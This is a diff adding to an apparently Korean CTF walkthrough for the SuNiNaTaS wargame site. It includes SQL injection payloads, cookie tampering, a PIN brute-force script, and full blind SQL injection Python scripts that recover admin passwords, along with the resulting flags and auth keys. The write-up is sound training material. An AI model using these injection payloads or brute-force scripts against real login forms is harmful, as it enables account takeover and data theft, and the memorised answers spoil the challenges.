@@ -10,6 +10,8 @@
 
 ### #1 level1
 
+keyword : string manipulation
+
 ```php
 <%
     str = Request("str")
@@ -35,6 +37,8 @@
 
 
 ### #2 level2
+
+keyword : bypass javascript
 
 ```html
 <script>
@@ -79,14 +83,15 @@ Hint를 보아하니 id와 passwd를 같게 한 뒤, document.web02.submit() 동
 
 style.css가 없어서 오류가 뜨기는 하는데, 굳이 중요한 것은 아니니 넘겨도 된다.
 
-
 [+] 다른 풀이 방법으로 개발자 도구를 사용하는 방법도 있다. 해당 경우 id와 pw를 같은 값으로 입력한 후, console에서 document.web02.submit()을 실행시키면 된다.
 
 
 
 
 
-### #3 level3
+### #3 Write articles in Notice Board!
+
+keyword : write board bug
 
 ![slevel3](./suninatas_image/slevel3.JPG)
 
@@ -166,7 +171,9 @@ Notice와 Q&A 게시판의 요청을 보면, divi 속성을 이용하여 두 게
 
 
 
-### #4 level4
+### #4 Point Plus
+
+keyword : user-agent
 
 ![slevel4](./suninatas_image/slevel4.JPG)
 
@@ -216,7 +223,478 @@ Fiddler의 Composer는 반복 요청을 할 때 매우 유용하게 쓸 수 있�
 
 
 
+### #5 level5
 
+keyword : packing
+
+![slevel5](./suninatas_image/slevel5.JPG)
+
+```html
+<script>
+	eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('g l=m o(\'0\',\'1\',\'2\',\'3\',\'4\',\'5\',\'6\',\'7\',\'8\',\'9\',\'a\',\'b\',\'c\',\'d\',\'e\',\'f\');p q(n){g h=\'\';g j=r;s(g i=t;i>0;){i-=4;g k=(n>>i)&u;v(!j||k!=0){j=w;h+=l[k]}}x(h==\'\'?\'0\':h)}',34,34,'||||||||||||||||var|result||start|digit|digitArray|new||Array|function|PASS|true|for|32|0xf|if|false|return'.split('|'),0,{}))		
+</script>
+<!--Hint : 12342046413275659 -->
+<!-- M@de by 2theT0P -->
+```
+
+굉장히 지저분한 무언가가 보인다.
+
+
+
+```js
+eval(function(p, a, c, k, e, r) {
+    e = function(c) {
+      //console.log(c.toString(a))
+      return c.toString(a)
+    };
+    if (!''.replace(/^/, String)) {
+        while (c--) r[e(c)] = k[c] || e(c);
+        k = [function(e) {
+            return r[e]
+        }];
+        e = function() {
+            return '\\w+'
+        };
+        c = 1
+    };
+    while (c--)
+        if (k[c]) p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]);
+    console.log(p)
+    return p
+}('g l=m o(\'0\',\'1\',\'2\',\'3\',\'4\',\'5\',\'6\',\'7\',\'8\',\'9\',\'a\',\'b\',\'c\',\'d\',\'e\',\'f\');p q(n){g h=\'\';g j=r;s(g i=t;i>0;){i-=4;g k=(n>>i)&u;v(!j||k!=0){j=w;h+=l[k]}}x(h==\'\'?\'0\':h)}', 34, 34, '||||||||||||||||var|result||start|digit|digitArray|new||Array|function|PASS|true|for|32|0xf|if|false|return'.split('|'), 0, {}))
+```
+
+결국 function(p,a,c,k,e,r)의 리턴 값이 p를 eval()로 실행하기 때문에, p 리턴 직전에 `console.log(p)`를 삽입하여 p를 출력해보면 어떤 스크립트를 실행하는지 알 수 있다.
+
+```js
+var digitArray = new Array('0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f');
+
+function PASS(n) {
+    var result = '';
+    var start = true;
+    for (var i = 32; i > 0;) {
+        i -= 4;
+        var digit = (n >> i) & 0xf;
+        if (!start || digit != 0) {
+            start = false;
+            result += digitArray[digit]
+        }
+    }
+    return (result == '' ? '0' : result)
+}
+```
+
+hint로 줬던 숫자를 잊지않고 여기에 집어넣어 `PASS(12342046413275659)`를 실행시켜보면, `9c43c20c` 를 얻을 수 있다. 
+
+이 값을 입력하고 `check` 버튼을 누르면 플래그가 똳
+
+![slevel5-1](./suninatas_image/slevel5-1.JPG)
+
+
+
+사실 중간에 구한 `9c43c20c`가 플래그인 줄 알고 여기서 한참 헤매다가 재미있는 걸 발견했다. `12342046413275659`는 실제로 `2BD9069C43C20B`이다. 여기서는 4바이트만 구하기 때문에 `9C43C20B`인데, 실제 script를 돌려서 나온 값은 이보다 1이 크다. ㅇ.ㅇ??? 
+
+알고 보니, `12342046413275659`를 `12342046413275660`로 인식한다.
+
+```js
+> console.log(12342046413275659)
+12342046413275660
+> console.log(12342046413275660)
+12342046413275660
+> console.log(12342046413275661)
+12342046413275660
+> console.log(12342046413275662)
+12342046413275662
+> console.log(12342046413275663)
+12342046413275664
+> console.log(12342046413275664)
+12342046413275664
+> console.log(12342046413275665)
+12342046413275664
+```
+
+JavaScript가 53 bit integer를 지원하기 때문이라고한다. 자세한 사항은  http://2ality.com/2012/07/large-integers.html를 참고해보는게 좋겠다.
+
+
+
+
+
+### #6 level6
+
+keyword : sql injection, cookie
+
+![slevel6](./suninatas_image/slevel6.JPG)
+
+요런 게시판이 존재한다. 코드 상 봐도 숨겨진 데이터는 없었다. 각 각의 게시물들을 살펴보면 다음과 같다. 
+
+![slevel6-1](./suninatas_image/slevel6-1.JPG)
+
+![slevel6-2](./suninatas_image/slevel6-2.JPG)
+
+세 번째 게시물인 README는 잠겨있고, 나머지 두 게시물은 봐도 뭔소리인지 잘 모르겠다. `Hint`를 보아하니 password를 찾아내던 우회하던 하여 README를 읽는 게 문제해결의 시작인 것 같다.
+
+![slevel6-3](./suninatas_image/slevel6-3.JPG)
+
+`"select szPwd from T_Web13 where nIdx = '3' and szPwd = '"&pwd&"'"`를 보아하니 Password로 입력한 값이 저 pwd에 위치하게 되는 것 같다. sql injection 문제이다. 다만 `' or 1=1 --`이 안되서 조금 헤맸는데, =이 아닌 다른 연산자를 사용해서 True로 만들어 주면 된다. 
+
+__' or 1<2 --__ 하니까 됬다.
+
+![slevel6-5](./suninatas_image/slevel6-5.JPG)
+
+![slevel6-6](./suninatas_image/slevel6-6.JPG)
+
+auth_key 값을 알아냈다. `suninatastopofworld!`
+
+그러나 아직도 README를 읽을 수는 없다. ㅇ.ㅇ??
+
+우우어어우우ㅏ아 하다가 QnA 게시판을 살펴보니 쿠키 값을 이용하란 말을 보게 되어, Fiddler로 자세히 살펴보았다.
+
+![slevel6-8](./suninatas_image/slevel6-8.JPG)
+
+우선 README 게시물에 접근할 때, idx, num, passcode를 사용하여 요청하는 것을 볼 수 있었고(사실 그냥 num=3로만 접근한 적이 있다. 어쩐지 안되더라니), 쿠키 값을 보면 auth_key=????? 로 되어있다. 딱봐도 여기에 아까 찾은 auth_key 값을 넣어서 보내주면 될 것 같다.
+
+근데 그냥 넣으면 또 안되고 다른 처리를 해줘야 한다. 여기서 또 삽질했는데, 아까 게시물 중 md5 hash 사이트를 안내해주던게 생각나서 md5로 해쉬 값을 넣어줬더니 됐다!
+
+![slevel6-7](./suninatas_image/slevel6-7.JPG)
+
+`65038b0559e459420aa2d23093d01e4a`로 수정
+
+![slevel6-9](./suninatas_image/slevel6-9.JPG)
+
+
+
+제대로 되었으면 이제 README를 읽을 수 있게 되었다. 여기까지가 2단계.
+
+![slevel6-10](./suninatas_image/slevel6-10.JPG)
+
+으아니 기대한 것과 다르게 별게 없다. 소스코드를 봐도 별다를 건 안보이고..
+
+다른 남은 게시물 중 PoP짱! 이게 좀 의심스러워서 구글링을 한참 해보았지만 별게 나오지는 않았다.
+
+혹시나 싶어 다시 README의 소스를 살펴보던 와중 조금 의심스러운게 보였음.
+
+```html
+<BODY>
+<table width="100%" cellpadding="0" cellspacing="0">
+<form method="post" name="KEY_HINT" action="Rome's First Emperor">
+	<tr>
+		<td align="center">
+			<table cellpadding="0" cellspacing="0">
+```
+
+진짜 action으로 저거 하는 줄 알고 찾아보다가, 설마하고 읭 진짜 키 힌트인가하고 입력해보니 ㄹㅇ이엇음..
+
+흠 꽤나 재미있었다.
+
+
+
+### #7 level7
+
+keyword : faster!, IU
+
+귀여운 아이유가 나온다. 아이유 카와이이이ㅣㅣ 근데 사진이 너무 큰 거 같다. 심쿵할뻔
+
+![slevel7](./suninatas_image/slevel7.JPG)
+
+```html
+<form method="post" action="./web07_1.asp" name="frm">
+<div align="center"><input type="button" name="main_btn" value="main" style="width:60" onclick="location.href='/main/main.asp'">&nbsp&nbsp&nbsp
+<input type="button" name="main_btn" value="Back" style="width:60" onclick="history.back()"></div>
+	<div align="center"><input type="hidden" name="web07" value="Do U Like girls?" ></div>
+	<div align="center"><img src="./iu.gif" width="700" height="1000" name="iu"></div>
+	<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+	<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+	<div align="center"><input type="submit" value="YES"></div>
+	<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+	<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+	<div align="center"><img src="./yoona.gif" width="700" height="1000" name="yoona"></div>
+</form>
+<!-- Hint : Faster and Faster -->
+<!-- M@de by 2theT0P -->
+```
+
+br로 도배해놨다. ㅎㄷㄷ Hint를 봐서나 아래의 web07_1.asp를 봤을 때, 이 문제의 아이디어는 web07.asp를 요청한 뒤 빠르게 yes 버튼을 눌러 web07_1.asp를 요청하는 게 핵심인 것 같다.
+
+```html
+		<script language="javascript">
+			alert("Wrong way!");
+			document.location.href='./web07.asp';
+		</script>
+		
+	<script language="javascript">
+		 alert("Fail..Your too slow");
+		 location.href="web07.asp";
+	</script>
+```
+
+
+
+막 새로고침해서 빠르게 하는 거는 다음의 코드로 인해 불가능하다.  
+
+```js
+function noEvent() {
+	if ( event.keyCode == 116 || event.keyCode == 9)
+	{
+		alert('No!');
+		return false;
+	}
+	else if(event.ctrlKey && (event.keyCode =78 || event.keyCode == 82))
+	{
+		return false;
+	}
+}
+document.onkeydown = noEvent;
+```
+
+대충 느낌상 알 수 있듯이 event.keyCode는 사용자 키보드 입력을 했을 때, 해당 하는 값의 key code 값을 나타내는 역할을 한다. `116 = F5`, `9 = TAB`, `ctrl && 78 = ctrl +  N`, `ctrl && 82 = ctrl + R`로 매핑된다. `document.onkeydown = noEvent` 이므로 키를 눌렀을 때 이벤트가 발생하고 문자가 입력된다. `return false`로 되어있으므로 해당하는 키들에 대한 입력은 무시된다는 것이다.
+
+
+
+뭐 특정 키만 막기 때문에 다른 키로 새로고침을 하던가 하는 꼼수를 써도 되겠지만, 그냥 코드짜서 바로 두 개의 요청을 날리면 된다. 우선 로그인한 사용자의 쿠키값을 등록시켜줘야 하고, web07.asp에 대한 요청은 GET이고 web07_1.asp에 대한 요청은 POST이기 때문에, POST의 경우 body content를 담아줘야 한다. fiddler로 보니 `web07=Do+U+Like+girls%3F` 를 보내더라. 디폴트가 GET이고 추가로 두 번째 인자를 넣어주면 POST로 되는 것 같다.
+
+```python
+import urllib.request
+
+target1 = 'http://suninatas.com/Part_one/web07/web07.asp'
+target2 = 'http://suninatas.com/Part_one/web07/web07_1.asp'
+
+data1 = urllib.request.Request(target1)
+data1.add_header("Cookie","ASPSESSIONIDCSAARTSC=KELNKLFBEBIHLHILKGKJNOBN; auth%5Fkey=%3F%3F%3F%3F%3F")
+
+data2 = urllib.request.Request(target2)
+data2.add_header("Cookie","ASPSESSIONIDCSAARTSC=KELNKLFBEBIHLHILKGKJNOBN; auth%5Fkey=%3F%3F%3F%3F%3F")
+
+resp1 = urllib.request.urlopen(data1).read()
+resp2 = urllib.request.urlopen(data2, 'web07=Do+U+Like+girls%3F'.encode('utf-8')).read()
+
+print(resp2)
+
+'''
+b'\r\n\t<script language="javascript">\r\n\t\talert("Congratulation!");\r\n\t</script>\r\n\tAuthkey : G0Od d@y'
+```
+
+
+
+다른 방법으로는 Fiddler에서 두 request를 선택한 뒤 replay 기능을 이용하여 마구 거의 동시에 날려주면 받을 수 있음!
+
+또 다른 사람들 풀이 좀 살펴보니까 개발자 도구에서 
+`location.href = "http://suninatas.com/Part_one/web07/web07.asp"` 요거 입력해서 새로고침 대신하고, 바로 `frm.submit()` 을 실행해서 yes 누른 것처럼 하는 방법도 있더라. frm은 저 submit을 포함하는 form 태그의 name 속성 값임.
+
+
+
+### #8 level8
+
+keyword : brute force
+
+![slevel8](./suninatas_image/slevel8.JPG)
+
+```html
+<!-- Hint : Login 'admin' Password in 0~9999 -->
+<!-- M@de by 2theT0P -->
+```
+
+brute force 문제인 것 같다. 
+
+id와 pw를 입력했을 때의 fiddler로 잡아본 결과 id와 pw는 body에 들어가고 POST 요청으로 나가는 것을 확인할 수 있었다.
+
+![slevel8-2](./suninatas_image/slevel8-2.JPG)
+
+적당히 다음과 같은 코드를 짜서 돌리면 된다.
+
+```python
+import urllib.request
+
+target = 'http://suninatas.com/Part_one/web08/web08.asp'
+r = urllib.request.Request(target)
+r.add_header("Cookie","ASPSESSIONIDCSAARTSC=KELNKLFBEBIHLHILKGKJNOBN")
+for i in range(0, 9999):
+    data = urllib.request.urlopen(r, ('id=admin&pw=' + str(i).zfill(4)).encode('utf-8')).read()
+    print(str(i).zfill(4))
+    if 'key' in str(data):
+        break
+print(data)
+```
+
+
+
+7707에서 터졌다!
+
+```shell
+7704
+7705
+7706
+7707
+b'\r\n\t\t<script>alert(\'Congratulation!\');</script>\r\n\t\r\n\r\n<html>\r\n\t<title>Game No.8</title>\r\n\t<head><link href="/include/style.css" rel="stylesheet" type="text/css"></head>\r\n\t<BODY>\r\n\t\t<form method="Post" action="./web08.asp">\r\n\t\t<br>\r\n\t\t\t\t<br>\r\n\t\t\t\t\t\t<br>\r\n\t\t\t\t\t\t\t\t<br>\r\n\t\t\t\t\t\t<br>\t\t\t\t\t\t\r\n\t\t\t\t<br>\r\n\t\t<br>\r\n\t\t<table width="240" cellpadding="0" cellspacing="0" align="center">\r\n\t\t\t\t<tr height="30">\r\n\t\t\t\t\t<td width="50%" class="table_top" align="center"><input type="button" name="main_btn" value="main" style="width:60" onclick="location.href=\'/main/main.asp\'"></td>\r\n\t\t\t\t\t<td width="50%" class="table_top" align="center"><input type="button" name="main_btn" value="Back" style="width:60" onclick="history.back()"></td>\r\n\t\t\t\t</tr>\r\n\t\t\t\t<tr height="30" class="table_main" >\r\n\t\t\t\t\t<td width="120" align="center" bgcolor="cccccc"><font size="2"><b>ID</b></font></td>\r\n\t\t\t\t\t<td width="120" align="center" bgcolor="cccccc"><input type="text" name="id" style="width:90" ></td>\r\n\t\t\t\t</tr>\r\n\t\t\t\t<tr height="30" class="table_main" >\r\n\t\t\t\t\t<td align="center" bgcolor="cccccc"><font size="2" ><b>PW</b></font></td>\r\n\t\t\t\t\t<td align="center" bgcolor="cccccc"><input type="password" name="pw" style="width:90" maxlength="4" ></td>\r\n\t\t\t\t</tr>\r\n\t\t\t\t<tr height="30">\r\n\t\t\t\t\t<td colspan="2" align="center" class="table_top" bgcolor="cccccc"><input type="button" name="btn" value="Login" onclick="submit()" size=20></td>\r\n\t\t\t\t</tr>\r\n\t\t\t\t<tr class="table_main" height="30">\r\n\t\t\t\t\t<td colspan="2" align="center" bgcolor="cccccc">Authkey : l3ruteforce P@ssword</td>\r\n\t\t\t\t</tr>\r\n\t\t\t</table>\r\n\t\t</form>\r\n\t</BODY>\r\n</html>\r\n\r\n\r\n<!-- Hint : Login \'admin\' Password in 0~9999 -->\r\n<!-- M@de by 2theT0P -->'
+```
+
+![slevel8-1](./suninatas_image/slevel8-1.JPG)
+
+### #22 Blind Sql Injection
+
+keyword : blind injection
+
+![slevel22](./suninatas_image/slevel22.JPG)
+
+```html
+<!-- Hint : guest / guest & Your goal is to find the admin's pw -->
+<!-- M@de by 2theT0P -->
+```
+
+Blind SQLinjection 문제이다.
+
+이것저것 시도해본 결과, 일단 특수문자는 대부분 안되는 것을 확인했다. 다행히 '는 되서 escape이 가능하다. white space가 필터링 대상이라 고민이 좀 됐는데, 다행히 %0a로 우회할 수 있었다.(찾아보니 괄호()로 감싸도 됨!) 
+
+```shell
+Part_one/web22/web22.asp?id=guest'and%0asubstring(pw,1,1)='g'--&pw=1234
+Part_one/web22/web22.asp?id=admin'and(len(pw)=10)--&pw=1234
+Part_one/web22/web22.asp?id=admin'and%0asubstring(pw,1,1)='a'--&pw=1234
+```
+
+위처럼 사용할 수 있다. len()을 이용하여 길이가 10인 걸 알 수 있었고, 나머지는 그냥 substring()을 이용해서 한글자씩 비교하도록 코드를 돌렸다.
+
+
+
+```python
+import urllib.request
+import string
+
+array = string.printable
+leak = ''
+
+for j in range(1, 11):
+    for i in array:
+        target = "http://suninatas.com/Part_one/web22/web22.asp?id=admin'and%0asubstring(pw,{},1)='{}'--&pw=1234"
+        re = urllib.request.Request(target.format(j,i))
+        re.add_header("Cookie","ASPSESSIONIDCSAARTSC=KELNKLFBEBIHLHILKGKJNOBN")
+
+        data = urllib.request.urlopen(re).read().decode('utf-8')
+        #print(data)
+        if 'OK' in data:
+            leak += i
+            print(leak)
+            break
+'''
+...
+N1c3Bil
+N1c3Biln
+N1c3Bilnl
+N1c3Bilnl)
+```
+
+
+
+
+
+### #23 Hard Blind Sql injection
+
+![slevel23](./suninatas_image/slevel23.JPG)
+
+```html
+<!-- Hint 1 : guest / guest & Your goal is to find the admin's pw -->
+<!-- Hint 2 : Bypass 'admin' string -->
+```
+
+이전 문제랑 거의 비슷한데, 막 쿼리 제한있고(30자) admin도 filtering 되어있고 뭐 그래서 좀 힘들었따. 특히 Mssql이라서 mid()도 없고, 30자 제한 때문에 left나 right 만으로 다 못해서, 결국 쪼개서 진행했다... ㅠ
+
+우선, 패스워드의 길이를 알아내었고, 글자 수 제한때문에 첫 번째 글자까지만 알 수 있다. v라는 걸 알 수 있다.
+
+```sql
+http://suninatas.com/Part_one/web23/web23.asp?id=adm'%2B'in' and len(pw)=12--&pw=1234
+http://suninatas.com/Part_one/web23/web23.asp?id=adm'%2B'in'and%20left(pw,1)='{}'--&pw=1234
+```
+
+여기서 이용할 수 있는게, id를 지정해주지 않으면 해당 컬럼에 있는 것들을 모두 참조한다는 것이다. 예를 들어, 본 문제에서는 guest와 admin이 존재하는데, id를 제대로 지정하지 않으면 left(pw,1)='g'도 참이고 left(pw,1)='v'도 참이다. 해당 방법을 이용하면 id 없이 패스워드를 알아낼 수 있다.
+
+다만 글자 수 제한때문에, 2글자를 구하지 못하는데 이는 id를 admin으로 지정한 상태롤 right()를 이용하여 한 글자를 알아낸 뒤, id 없이 right()를 이용하여 남은 글자까지 알아내는 방식으로 진행하면 된다.
+
+
+
+```python
+import urllib.request
+import string
+
+array = string.printable
+cookie = 'ASPSESSIONIDCSAARTSC=KELNKLFBEBIHLHILKGKJNOBN; auth%5Fkey=%3F%3F%3F%3F%3F; ASPSESSIONIDSQDCQQTD=PDPHOHCCIHILGKBBHBPLHGCI'
+
+leak = ''
+
+for i in array:
+    target = "http://suninatas.com/Part_one/web23/web23.asp?id=adm'%2B'in'and%20left(pw,1)='{}'--&pw=1234"
+    re = urllib.request.Request(target.format(i))
+    re.add_header("Cookie",cookie)
+    try:
+        data = urllib.request.urlopen(re).read().decode('utf-8')
+    except:
+        continue
+    if 'OK' in data:
+        leak += i
+        print(leak)
+        break
+
+for j in range(2, 11):
+    for i in array:
+        target = "http://suninatas.com/Part_one/web23/web23.asp?id='or%20left(pw,{})='{}'--&pw=1"
+        re = urllib.request.Request(target.format(j,leak+i))
+        #print(target.format(j, leak+i))
+        re.add_header("Cookie",cookie)
+        
+        try:
+            data = urllib.request.urlopen(re).read().decode('utf-8')
+        except:
+            continue
+        
+        if 'OK' in data:
+            leak += i
+            print(leak)
+            break
+
+reversed_s = ''
+for i in array:
+    target = "http://suninatas.com/Part_one/web23/web23.asp?id=adm'%2b'in'and%20right(pw,1)='{}'--&pw=1"
+    re = urllib.request.Request(target.format(i+reversed_s))
+    #print(target.format(i+reversed_s))
+    re.add_header("Cookie",cookie)
+        
+    try:
+        data = urllib.request.urlopen(re).read().decode('utf-8')
+    except:
+        continue
+        
+    if 'OK' in data:
+        reversed_s = i + reversed_s
+        print(leak+reversed_s.zfill(2))
+        break
+
+for i in array:
+    target = "http://suninatas.com/Part_one/web23/web23.asp?id='or%20right(pw,2)='{}'--&pw=1"
+    re = urllib.request.Request(target.format(i+reversed_s))
+    #print(target.format(i+reversed_s))
+    re.add_header("Cookie",cookie)
+        
+    try:
+        data = urllib.request.urlopen(re).read().decode('utf-8')
+    except:
+        continue
+        
+    if 'OK' in data:
+        reversed_s = i + reversed_s
+        print(leak+reversed_s)
+        break
+
+'''
+v
+v3
+v3r
+v3ry
+v3ryh
+v3ryha
+v3ryhar
+v3ryhard
+v3ryhards
+v3ryhardsq
+v3ryhardsq0i
+v3ryhardsqli
+```
 
 
 
@@ -228,7 +706,7 @@ Fiddler의 Composer는 반복 요청을 할 때 매우 유용하게 쓸 수 있�
 
 ### #14 Do you know password of suninatas?
 
-summary : decrypt /etc/shadow SHA512
+keyword : crack /etc/shadow SHA512
 
 #### /etc/shadow
 
@@ -291,7 +769,7 @@ root와 suninatas의 패스워드를 구했다. 답은 suninatas의 패스워드
 
 ### #15 Do you like music? Hint : AuthKey is in this file.
 
-summary : search meta data
+keyword : meta-data
 
 `diary.mp3` 파일을 얻을 수 있다. 처음에는 스펙토그램 문제인 줄 알고 삽질했는데, 속성 창에 있는 메타 정보를 읽는 문제였다.
 
@@ -304,6 +782,8 @@ summary : search meta data
 ## misc
 
 ### #13 KEY Finding
+
+keyword : zip, decrypt
 
 현재 프레임의 소스를 보면 다음과 같은 힌트를 볼 수 있다.
 
@@ -354,7 +834,7 @@ passwd : 7642를 사용하여 압축을 풀면 4개의 jpg 파일과 1개의 txt
 파일들에서 "key"를 키워드로 하여 문자열을 검색해서 나온 결과를 모두 합치면 Solve.
 
 ```shell
- ch4rli3kop@ch4rli3kop-pc  /mnt/d/Download/web13  strings * | grep "key"
+> strings * | grep "key"
 first key : 3nda192n
 second key : 84ed1cae
 third key: 8abg9295
